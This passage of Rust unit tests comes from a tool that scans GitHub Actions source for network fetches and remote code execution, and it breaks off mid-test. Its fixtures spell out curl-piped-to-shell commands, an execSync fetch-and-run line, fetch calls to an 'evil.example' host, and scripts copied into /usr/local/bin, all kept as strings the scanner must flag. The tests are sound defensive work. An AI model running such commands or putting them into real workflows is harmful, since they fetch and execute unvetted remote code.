        std::fs::create_dir_all(action_dir.join("node_modules/dep")).unwrap();
        std::fs::create_dir_all(action_dir.join("dist")).unwrap();
        std::fs::create_dir_all(action_dir.join("src")).unwrap();
        std::fs::write(action_dir.join("action.yml"), "name: local\n").unwrap();
        std::fs::write(
            action_dir.join("dist/helper.mjs"),
            "fetch('https://example.com/x')",
        )
        .unwrap();
        std::fs::write(
            action_dir.join("dist/index.js"),
            "fetch('https://example.com/x')",
        )
        .unwrap();
        std::fs::write(
            action_dir.join("src/main.cjs"),
            "fetch('https://example.com/x')",
        )
        .unwrap();
        std::fs::write(
            action_dir.join("setup.py"),
            "requests.get('https://example.com/x')",
        )
        .unwrap();
        std::fs::write(
            action_dir.join("node_modules/dep/index.js"),
            "fetch('https://evil.example/x')",
        )
        .unwrap();

        let (got, available, complete) = collect_local_source_files(&action_dir).unwrap();
        assert!(complete);
        let paths: Vec<_> = got
            .iter()
            .map(|(path, _)| {
                path.strip_prefix(&action_dir)
                    .unwrap()
                    .to_string_lossy()
                    .replace('\\', "/")
            })
            .collect();
        assert_eq!(paths, vec!["action.yml"]);
        assert_eq!(available.len(), 5);
    }

    #[test]
    fn read_local_source_file_returns_none_for_missing_file() {
        let dir = tempfile::TempDir::new().unwrap();
        assert!(
            read_local_source_file(dir.path(), &dir.path().join("missing.js"))
                .unwrap()
                .is_none()
        );
    }

    #[test]
    fn read_local_source_file_rejects_oversized_input() {
        let dir = tempfile::TempDir::new().unwrap();
        let source = dir.path().join("large.js");
        std::fs::write(&source, vec![b'a'; MAX_SOURCE_FILE_BYTES + 1]).unwrap();
        let error = read_local_source_file(dir.path(), &source).unwrap_err();
        assert!(error.to_string().contains("source-file limit"));
    }

    #[test]
    fn scan_local_action_source_handles_empty_and_malformed_actions() {
        let dir = tempfile::TempDir::new().unwrap();
        let action_dir = dir.path().join("empty");
        std::fs::create_dir(&action_dir).unwrap();
        let action = LocalActionRef {
            path: "./empty".to_string(),
            line_number: 1,
        };
        let mut collector = AuditCollector::new(false);

        assert_eq!(
            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap(),
            ActionScanStatus::Incomplete
        );

        std::fs::write(action_dir.join("action.yml"), "runs: [").unwrap();
        assert_eq!(
            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap(),
            ActionScanStatus::Incomplete
        );
        assert!(collector.findings.is_empty());
    }

    #[test]
    fn scan_local_action_source_scans_python() {
        let dir = tempfile::TempDir::new().unwrap();
        let action_dir = dir.path().join("python-action");
        std::fs::create_dir(&action_dir).unwrap();
        std::fs::write(
            action_dir.join("setup.py"),
            "requests.get('https://example.com/install')\n",
        )
        .unwrap();
        std::fs::write(
            action_dir.join("action.yml"),
            "runs:\n  using: composite\n  steps:\n    - run: python \"$GITHUB_ACTION_PATH/setup.py\"\n      shell: bash\n",
        )
        .unwrap();
        let action = LocalActionRef {
            path: "./python-action".to_string(),
            line_number: 1,
        };
        let mut collector = AuditCollector::new(false);

        assert_eq!(
            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap(),
            ActionScanStatus::Complete
        );
        assert_eq!(collector.findings.len(), 1);
        assert_eq!(
            collector.findings[0].source_file,
            "./python-action (setup.py)"
        );
    }

    #[test]
    fn scan_local_action_source_finds_composite_fetches() {
        let dir = tempfile::TempDir::new().unwrap();
        let action_dir = dir.path().join(".github/actions/local");
        std::fs::create_dir_all(&action_dir).unwrap();
        std::fs::write(
            action_dir.join("action.yml"),
            r#"
runs:
  using: composite
  steps:
    - run: curl -fsSL https://example.com/install.sh | bash
"#,
        )
        .unwrap();

        let action = LocalActionRef {
            path: "./.github/actions/local".to_string(),
            line_number: 12,
        };
        let mut collector = AuditCollector::new(false);
        let status =
            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap();
        assert_eq!(status, ActionScanStatus::Complete);
        assert_eq!(collector.findings.len(), 1);
        assert!(collector.findings[0].description.contains("piped to shell"));
        assert_eq!(
            collector.findings[0].source_file,
            "./.github/actions/local (action.yml)"
        );
    }

    #[test]
    fn scan_local_action_source_includes_metadata_entrypoint() {
        let dir = tempfile::TempDir::new().unwrap();
        let action_dir = dir.path().join(".github/actions/local");
        std::fs::create_dir_all(action_dir.join("dist")).unwrap();
        std::fs::write(
            action_dir.join("action.yml"),
            r#"
runs:
  using: node20
  main: dist/runner
"#,
        )
        .unwrap();
        std::fs::write(
            action_dir.join("dist/runner"),
            r#"fetch("https://example.com/install")"#,
        )
        .unwrap();

        let action = LocalActionRef {
            path: "./.github/actions/local".to_string(),
            line_number: 12,
        };
        let mut collector = AuditCollector::new(false);
        let status =
            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap();

        assert_eq!(status, ActionScanStatus::Complete);
        assert_eq!(collector.findings.len(), 1);
        assert_eq!(
            collector.findings[0].source_file,
            "./.github/actions/local (dist/runner)"
        );
    }

    #[test]
    fn scan_local_action_source_scans_in_tree_imports_without_losing_completeness() {
        let dir = tempfile::TempDir::new().unwrap();
        let action_dir = dir.path().join(".github/actions/local");
        std::fs::create_dir_all(&action_dir).unwrap();
        std::fs::write(
            action_dir.join("action.yml"),
            "runs:\n  using: node20\n  main: index.js\n",
        )
        .unwrap();
        std::fs::write(action_dir.join("index.js"), "require('./helper.js');\n").unwrap();
        std::fs::write(
            action_dir.join("helper.js"),
            "fetch('https://example.com/latest/tool');\n",
        )
        .unwrap();

        let action = LocalActionRef {
            path: "./.github/actions/local".to_string(),
            line_number: 1,
        };
        let mut collector = AuditCollector::new(false);
        let status =
            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap();

        assert_eq!(status, ActionScanStatus::Complete);
        assert!(!collector.findings.is_empty());
        assert!(
            collector
                .findings
                .iter()
                .all(|finding| finding.source_file.ends_with("(helper.js)"))
        );
    }

    #[test]
    fn scan_local_action_source_accepts_common_in_tree_runtime_shapes() {
        let dir = tempfile::TempDir::new().unwrap();
        let action_dir = dir.path().join(".github/actions/local");
        std::fs::create_dir_all(&action_dir).unwrap();
        std::fs::write(
            action_dir.join("action.yml"),
            "runs:\n  using: docker\n  image: Dockerfile\n",
        )
        .unwrap();
        std::fs::write(
            action_dir.join("Dockerfile"),
            "FROM alpine:3.20\nCOPY entrypoint.sh /entrypoint.sh\n",
        )
        .unwrap();
        std::fs::write(action_dir.join("entrypoint.sh"), "source ./helper.sh\n").unwrap();
        std::fs::write(action_dir.join("helper.sh"), "echo safe\n").unwrap();
        std::fs::write(action_dir.join("helper.py"), "import os\n").unwrap();

        let action = LocalActionRef {
            path: "./.github/actions/local".to_string(),
            line_number: 1,
        };
        let mut collector = AuditCollector::new(false);
        let status =
            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap();

        assert_eq!(status, ActionScanStatus::Complete);
    }

    #[test]
    fn scan_local_action_source_follows_copied_javascript_wrapper() {
        let dir = tempfile::TempDir::new().unwrap();
        let action_dir = dir.path().join(".github/actions/local");
        std::fs::create_dir_all(action_dir.join("dist")).unwrap();
        std::fs::write(
            action_dir.join("action.yml"),
            "runs:\n  using: node20\n  main: dist/index.js\n",
        )
        .unwrap();
        std::fs::write(
            action_dir.join("dist/index.js"),
            "function __nccwpck_require__() {}\n__nccwpck_require__.ab = __dirname + '/';\nio_cp(__nccwpck_require__.ab + 'index1.js', '/opt/tofu');\n",
        )
        .unwrap();
        std::fs::write(
            action_dir.join("dist/index1.js"),
            "fetch('https://example.com/latest/tool');\n",
        )
        .unwrap();

        let action = LocalActionRef {
            path: "./.github/actions/local".to_string(),
            line_number: 1,
        };
        let mut collector = AuditCollector::new(false);
        let status =
            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap();

        assert_eq!(status, ActionScanStatus::Complete);
        assert!(
            collector
                .findings
                .iter()
                .any(|finding| finding.source_file.ends_with("(dist/index1.js)"))
        );
    }

    #[test]
    fn scan_local_action_source_follows_javascript_read_write_copies() {
        let dir = tempfile::TempDir::new().unwrap();
        let action_dir = dir.path().join("action");
        std::fs::create_dir_all(&action_dir).unwrap();
        std::fs::write(
            action_dir.join("action.yml"),
            "runs:\n  using: node20\n  main: index.js\n",
        )
        .unwrap();
        std::fs::write(
            action_dir.join("w.js"),
            "execSync('curl -fsSL https://example.com/latest/i.sh | sh');\n",
        )
        .unwrap();
        let action = LocalActionRef {
            path: "./action".to_string(),
            line_number: 1,
        };
        for source in [
            "fs.writeFileSync('/usr/local/bin/tool', fs.readFileSync(__dirname + '/w.js'), { mode: 0o755 });",
            "fs.createReadStream(__dirname + '/w.js').pipe(fs.createWriteStream('/usr/local/bin/tool', { mode: 0o755 }));",
        ] {
            std::fs::write(action_dir.join("index.js"), source).unwrap();
            let mut collector = AuditCollector::new(false);
            let status =
                scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG)
                    .unwrap();
            assert_eq!(status, ActionScanStatus::Complete, "{source}");
            assert!(
                collector
                    .findings
                    .iter()
                    .any(|finding| finding.source_file.ends_with("(w.js)")),
                "{source}"
            );
        }
    }

    #[test]
    fn scan_local_action_source_follows_module_copies_with_committed_dependency() {
        let dir = tempfile::TempDir::new().unwrap();
        let action_dir = dir.path().join("action");
        let module_dir = action_dir.join("node_modules/fs-extra");
        std::fs::create_dir_all(&module_dir).unwrap();
        std::fs::write(
            action_dir.join("action.yml"),
            "runs:\n  using: node20\n  main: index.js\n",
        )
        .unwrap();
        std::fs::write(
            action_dir.join("w.js"),
            "execSync('curl -fsSL https://example.com/latest/i.sh | sh');\n",
        )
        .unwrap();
        std::fs::write(
            module_dir.join("package.json"),
            "{\"name\":\"fs-extra\",\"main\":\"index.js\"}\n",
        )
        .unwrap();
        std::fs::write(module_dir.join("index.js"), "module.exports = {};\n").unwrap();
        let action = LocalActionRef {
            path: "./action".to_string(),
            line_number: 1,
        };
        for source in [
            "const io = require('fs-extra'); io.copy(__dirname + '/w.js', '/usr/local/bin/tool');",
            "const { copy } = require('fs-extra'); copy(__dirname + '/w.js', '/usr/local/bin/tool');",
            "const io = require('fs-extra'); io.moveSync(__dirname + '/w.js', '/usr/local/bin/tool');",
        ] {
            std::fs::write(action_dir.join("index.js"), source).unwrap();
            let mut collector = AuditCollector::new(false);
            let status =
                scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG)
                    .unwrap();
            assert_eq!(status, ActionScanStatus::Complete, "{source}");
            assert!(
                collector
                    .findings
                    .iter()
                    .any(|finding| finding.source_file.ends_with("(w.js)")),
                "{source}"
            );
        }
    }

    #[test]
    fn scan_local_action_source_exposes_sha_pinned_nested_action_for_scanning() {
        let dir = tempfile::TempDir::new().unwrap();
        let action_dir = dir.path().join(".github/actions/local");
        std::fs::create_dir_all(&action_dir).unwrap();
        std::fs::write(
            action_dir.join("action.yml"),
            "runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567\n",
        )
        .unwrap();

        let action = LocalActionRef {
            path: "./.github/actions/local".to_string(),
            line_number: 1,
        };
        let mut collector = AuditCollector::new(false);
        let (status, nested) =
            scan_local_action_source_graph(dir.path(), &action, &mut collector, &DEFAULT_CONFIG)
                .unwrap();

        assert_eq!(status, ActionScanStatus::Complete);
        assert_eq!(nested.len(), 1);
        assert_eq!(nested[0].owner_repo(), "actions/checkout");
        assert_eq!(
            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap(),
            ActionScanStatus::Incomplete
        );
        assert!(collector.findings.is_empty());
    }

    #[test]
    fn scan_local_action_source_rejects_parent_escape() {
        let dir = tempfile::TempDir::new().unwrap();
        let action = LocalActionRef {
            path: "./../outside".to_string(),
            line_number: 1,
        };
        let mut collector = AuditCollector::new(false);
        assert!(
            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).is_err()
        );
    }

    #[test]
    fn scan_local_action_source_rejects_invalid_or_missing_directory() {
        let dir = tempfile::TempDir::new().unwrap();
        let mut collector = AuditCollector::new(false);

        for (path, expected) in [
            ("local", "local action path must start with ./"),
            ("./missing", "is not a directory"),
        ] {
            let action = LocalActionRef {
                path: path.to_string(),
                line_number: 1,
            };
            let err =
                scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG)
                    .unwrap_err();
            assert!(err.to_string().contains(expected), "path: {path}: {err}");
        }
    }

    #[test]
    fn scan_local_action_source_rejects_symlinked_action_root() {
        let dir = tempfile::TempDir::new().unwrap();
        let outside = tempfile::TempDir::new().unwrap();
        std::fs::write(outside.path().join("action.yml"), "name: outside\n").unwrap();
        let actions_dir = dir.path().join(".github/actions");
        std::fs::create_dir_all(&actions_dir).unwrap();
        std::os::unix::fs::symlink(outside.path(), actions_dir.join("local")).unwrap();

        let action = LocalActionRef {
            path: "./.github/actions/local".to_string(),
            line_number: 1,
        };
        let mut collector = AuditCollector::new(false);
        let err = scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG)
            .unwrap_err();

        assert!(
            err.to_string()
                .contains("Refusing to scan symlinked directory")
        );
        assert!(collector.findings.is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn scan_local_action_source_rejects_symlinked_entrypoint_component() {
        let dir = tempfile::TempDir::new().unwrap();
        let outside = tempfile::TempDir::new().unwrap();
        std::fs::write(
            outside.path().join("leak.js"),
            r#"fetch("https://example.com/OUT_OF_REPO_SECRET")"#,
        )
        .unwrap();

        let action_dir = dir.path().join(".github/actions/local");
        std::fs::create_dir_all(&action_dir).unwrap();
        std::fs::write(
            action_dir.join("action.yml"),
            "name: local\nruns:\n  using: node20\n  main: sub/leak.js\n",
        )
        .unwrap();
        std::os::unix::fs::symlink(outside.path(), action_dir.join("sub")).unwrap();

        let action = LocalActionRef {
            path: "./.github/actions/local".to_string(),
            line_number: 1,
        };
        let mut collector = AuditCollector::new(false);
        scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap();

        assert!(collector.findings.is_empty());
    }

    #[tokio::test]
    async fn nested_action_output_is_not_independent_verification_material() {
        use serde_json::json;
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let sha = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
        for first_step in [
            "    - uses: $/child\n".to_string(),
            format!("    - uses: o/r/child@{sha}\n"),
        ] {
            let server = MockServer::start().await;
            Mock::given(method("GET"))
                .and(path(format!("/repos/o/r/git/trees/{sha}")))
                .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                    "tree": [
                        { "path": "action.yml", "type": "blob" },
                        { "path": "child/action.yml", "type": "blob" }
                    ],
                    "truncated": false
                })))
                .mount(&server)
                .await;
            let parent = format!(
                "runs:\n  using: composite\n  steps:\n{first_step}    - shell: bash\n      run: |\n        curl -sSfL https://example.invalid/tool -o tool\n        minisign -V -m tool -p key.pub\n"
            );
            for (file, body) in [
                ("action.yml", parent),
                (
                    "child/action.yml",
                    "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl -sSfL https://example.invalid/v1.2.3/key.pub -o key.pub\n".to_string(),
                ),
            ] {
                Mock::given(method("GET"))
                    .and(path(format!("/repos/o/r/contents/{file}")))
                    .respond_with(ResponseTemplate::new(200).set_body_string(body))
                    .mount(&server)
                    .await;
            }
            let client = GitHubClient::with_base("t".into(), server.uri());
            let action = ActionRef {
                owner: "o".into(),
                repo: "r".into(),
                subpath: None,
                ref_string: sha.into(),
                ref_type: workflow::RefType::Sha,
                tag_comment: None,
                line_number: 1,
                raw_line: String::new(),
                value_start: 0,
                value_end: 0,
                block_style: true,
            };
            let mut collector = AuditCollector::new(false);
            scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
                .await
                .unwrap();
            assert_eq!(collector.findings.len(), 1, "{first_step}");
        }
    }

    #[tokio::test]
    async fn scan_action_source_accepts_truncated_tree_with_exact_metadata() {
        use serde_json::json;
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path(
                "/repos/o/r/git/trees/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            ))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "tree": [{ "path": "action.yml", "type": "blob" }],
                "truncated": true
            })))
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/o/r/contents/action.yml"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string("runs:\n  using: composite\n  steps: []\n"),
            )
            .mount(&server)
            .await;

        let client = GitHubClient::with_base("t".into(), server.uri());
        let action = ActionRef {
            owner: "o".into(),
            repo: "r".into(),
            subpath: None,
            ref_string: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".into(),
            ref_type: workflow::RefType::Sha,
            tag_comment: Some("v1.0.0".into()),
            line_number: 1,
            raw_line: String::new(),
            value_start: 0,
            value_end: 0,
            block_style: true,
        };
        let mut collector = AuditCollector::new(false);

        let status = scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
            .await
            .unwrap();

        assert_eq!(status, ActionScanStatus::Complete);
        assert!(collector.findings.is_empty());
    }

    #[tokio::test]
    async fn remote_subpaths_resolve_without_covering_missing_or_escaping_paths() {
        use serde_json::json;
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};
        let server = MockServer::start().await;
        let sha = "a".repeat(40);
        Mock::given(method("GET"))
            .and(path(format!("/repos/o/r/git/trees/{sha}")))
            .respond_with(ResponseTemplate::new(200).set_body_json(
                json!({"tree":[{"path":"nested/action.yml", "type":"blob"}], "truncated":false}),
            ))
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/o/r/contents/nested/action.yml"))
            .respond_with(ResponseTemplate::new(200).set_body_string("runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl https://example.com/tool | bash\n"))
            .mount(&server).await;
        let client = GitHubClient::with_base("t".into(), server.uri());
        for (subpath, expected, count) in [
            ("nested", ActionScanStatus::Complete, 1),
            ("./nested/", ActionScanStatus::Complete, 1),
            ("other/../nested", ActionScanStatus::Complete, 1),
            ("missing", ActionScanStatus::Incomplete, 0),
            ("../../nested", ActionScanStatus::Incomplete, 0),
        ] {
            let action = ActionRef {
                owner: "o".into(),
                repo: "r".into(),
                subpath: Some(subpath.into()),
                ref_string: sha.clone(),
                ref_type: workflow::RefType::Sha,
                tag_comment: None,
                line_number: 1,
                raw_line: String::new(),
                value_start: 0,
                value_end: 0,
                block_style: true,
            };
            let mut collector = AuditCollector::new(false);
            assert_eq!(
                scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
                    .await
                    .unwrap(),
                expected,
                "{subpath}"
            );
            assert_eq!(collector.findings.len(), count, "{subpath}");
        }
    }

    #[tokio::test]
    async fn scan_action_source_follows_sha_pinned_nested_action() {
        use serde_json::json;
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;
        let root_sha = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
        let child_sha = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
        Mock::given(method("GET"))
            .and(path(format!("/repos/o/root/git/trees/{root_sha}")))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "tree": [{ "path": "action.yml", "type": "blob" }]
            })))
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/o/root/contents/action.yml"))
            .respond_with(ResponseTemplate::new(200).set_body_string(format!(
                "runs:\n  using: composite\n  steps:\n    - uses: x/child@{child_sha}\n"
            )))
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path(format!("/repos/x/child/git/trees/{child_sha}")))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "tree": [{ "path": "action.yml", "type": "blob" }]
            })))
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/x/child/contents/action.yml"))
            .respond_with(ResponseTemplate::new(200).set_body_string(
                "runs:\n  using: composite\n  steps:\n    - run: curl https://example.com/install | bash\n      shell: bash\n",
            ))
            .mount(&server)
            .await;

        let client = GitHubClient::with_base("t".into(), server.uri());
        let action = ActionRef {
            owner: "o".into(),
            repo: "root".into(),
            subpath: None,
            ref_string: root_sha.into(),
            ref_type: workflow::RefType::Sha,
            tag_comment: Some("v1.0.0".into()),
            line_number: 1,
            raw_line: String::new(),
            value_start: 0,
            value_end: 0,
            block_style: true,
        };
        let mut collector = AuditCollector::new(false);

        let status = scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
            .await
            .unwrap();

        assert_eq!(status, ActionScanStatus::Complete);
        assert_eq!(collector.findings.len(), 1);
        assert_eq!(collector.findings[0].source_file, "x/child (action.yml)");
    }

    #[tokio::test]
    async fn scan_action_source_rejects_mutable_nested_action_ref() {
        use serde_json::json;
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;
        let root_sha = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
        Mock::given(method("GET"))
            .and(path(format!("/repos/o/root/git/trees/{root_sha}")))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "tree": [{ "path": "action.yml", "type": "blob" }]
            })))
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/o/root/contents/action.yml"))
            .respond_with(ResponseTemplate::new(200).set_body_string(
                "runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@v4\n",
            ))
            .mount(&server)
            .await;

        let client = GitHubClient::with_base("t".into(), server.uri());
        let action = ActionRef {
            owner: "o".into(),
            repo: "root".into(),
            subpath: None,
            ref_string: root_sha.into(),
            ref_type: workflow::RefType::Sha,
            tag_comment: None,
            line_number: 1,
            raw_line: String::new(),
            value_start: 0,
            value_end: 0,
            block_style: true,
        };
        let mut collector = AuditCollector::new(false);

        let status = scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
            .await
            .unwrap();

        assert_eq!(status, ActionScanStatus::Incomplete);
        assert!(collector.findings.is_empty());
    }

    #[tokio::test]
    async fn scan_action_source_reports_incomplete_when_truncated_tree_has_no_targets() {
        use serde_json::json;
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path(
                "/repos/o/r/git/trees/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            ))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "tree": [{ "path": "README.md", "type": "blob" }],
                "truncated": true
            })))
            .mount(&server)
            .await;

        let client = GitHubClient::with_base("t".into(), server.uri());
        let action = ActionRef {
            owner: "o".into(),
            repo: "r".into(),
            subpath: None,
            ref_string: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".into(),
            ref_type: workflow::RefType::Sha,
            tag_comment: Some("v1.0.0".into()),
            line_number: 1,
            raw_line: String::new(),
            value_start: 0,
            value_end: 0,
            block_style: true,
        };
        let mut collector = AuditCollector::new(false);

        let status = scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
            .await
            .unwrap();

        assert_eq!(status, ActionScanStatus::Incomplete);
        assert!(collector.findings.is_empty());
    }

    #[tokio::test]
    async fn scan_action_source_reports_incomplete_when_any_file_fetch_fails() {
        use serde_json::json;
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path(
                "/repos/o/r/git/trees/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            ))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "tree": [
                    { "path": "action.yml", "type": "blob" },
                    { "path": "dist/index.js", "type": "blob" }
                ]
            })))
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/o/r/contents/action.yml"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string("runs:\n  using: node20\n  main: dist/index.js\n"),
            )
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/o/r/contents/dist/index.js"))
            .respond_with(ResponseTemplate::new(500))
            .mount(&server)
            .await;

        let client = GitHubClient::with_base("t".into(), server.uri());
        let action = ActionRef {
            owner: "o".into(),
            repo: "r".into(),
            subpath: None,
            ref_string: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".into(),
            ref_type: workflow::RefType::Sha,
            tag_comment: Some("v1.0.0".into()),
            line_number: 1,
            raw_line: String::new(),
            value_start: 0,
            value_end: 0,
            block_style: true,
        };
        let mut collector = AuditCollector::new(false);

        let status = scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
            .await
            .unwrap();

        assert_eq!(status, ActionScanStatus::Incomplete);
        assert!(
            collector.findings.is_empty(),
            "failed fetch should not invent findings, only block clean caching"
        );
    }

    #[tokio::test]
    async fn scan_action_source_includes_metadata_entrypoint() {
        use serde_json::json;
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path(
                "/repos/o/r/git/trees/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            ))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "tree": [
                    { "path": "action.yml", "type": "blob" },
                    { "path": "dist/runner", "type": "blob" }
                ]
            })))
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/o/r/contents/action.yml"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string("runs:\n  using: node20\n  main: dist/runner\n"),
            )
            .up_to_n_times(1)
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/o/r/contents/dist/runner"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string(r#"fetch("https://example.com/install")"#),
            )
            .mount(&server)
            .await;

        let client = GitHubClient::with_base("t".into(), server.uri());
        let action = ActionRef {
            owner: "o".into(),
            repo: "r".into(),
            subpath: None,
            ref_string: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".into(),
            ref_type: workflow::RefType::Sha,
            tag_comment: Some("v1.0.0".into()),
            line_number: 1,
            raw_line: String::new(),
            value_start: 0,
            value_end: 0,
            block_style: true,
        };
        let mut collector = AuditCollector::new(false);

        let status = scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
            .await
            .unwrap();

        assert_eq!(status, ActionScanStatus::Complete);
        assert_eq!(collector.findings.len(), 1);
        assert_eq!(collector.findings[0].source_file, "o/r (dist/runner)");
    }

    #[tokio::test]
    async fn root_action_scan_routes_only_its_reachable_python() {
        use serde_json::json;
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path(
                "/repos/o/r/git/trees/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            ))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "tree": [
                    { "path": "action.yml", "type": "blob" },
                    { "path": "sub/action.yml", "type": "blob" },
                    { "path": "setup.py", "type": "blob" },
                    { "path": "sub/Dockerfile", "type": "blob" }
                ]
            })))
            .mount(&server)
            .await;
        for (source_path, content) in [
            (
                "action.yml",
                "runs:\n  using: composite\n  steps:\n    - run: python \"$GITHUB_ACTION_PATH/setup.py\"\n      shell: bash\n",
            ),
            (
                "sub/action.yml",
                "runs:\n  using: docker\n  image: Dockerfile\n",
            ),
            ("setup.py", "requests.get('https://example.com/install')\n"),
            (
                "sub/Dockerfile",
                "FROM alpine:3.20\nRUN curl https://example.com/install -o tool\n",
            ),
        ] {
            Mock::given(method("GET"))
                .and(path(format!("/repos/o/r/contents/{source_path}")))
                .respond_with(ResponseTemplate::new(200).set_body_string(content))
                .mount(&server)
                .await;
        }

        let client = GitHubClient::with_base("t".into(), server.uri());
        let action = ActionRef {
            owner: "o".into(),
            repo: "r".into(),
            subpath: None,
            ref_string: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".into(),
            ref_type: workflow::RefType::Sha,
            tag_comment: Some("v1.0.0".into()),
            line_number: 1,
            raw_line: String::new(),
            value_start: 0,
            value_end: 0,
            block_style: true,
        };
        let mut collector = AuditCollector::new(false);

        let status = scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
            .await
            .unwrap();

        assert_eq!(status, ActionScanStatus::Complete);
        assert_eq!(collector.findings.len(), 1);
        assert!(
            collector
                .findings
                .iter()
                .any(|finding| finding.source_file == "o/r (setup.py)")
        );
        assert!(
            !collector
                .findings
                .iter()
                .any(|finding| finding.source_file == "o/r (sub/Dockerfile)")
        );
    }

    #[tokio::test]
    async fn repo_scan_includes_subpath_metadata_entrypoint() {
        use serde_json::json;
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path(
                "/repos/o/r/git/trees/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            ))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "tree": [
                    { "path": "sub/action.yml", "type": "blob" },
                    { "path": "lib/runner", "type": "blob" }
                ]
            })))
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/o/r/contents/sub/action.yml"))
            .respond_with(
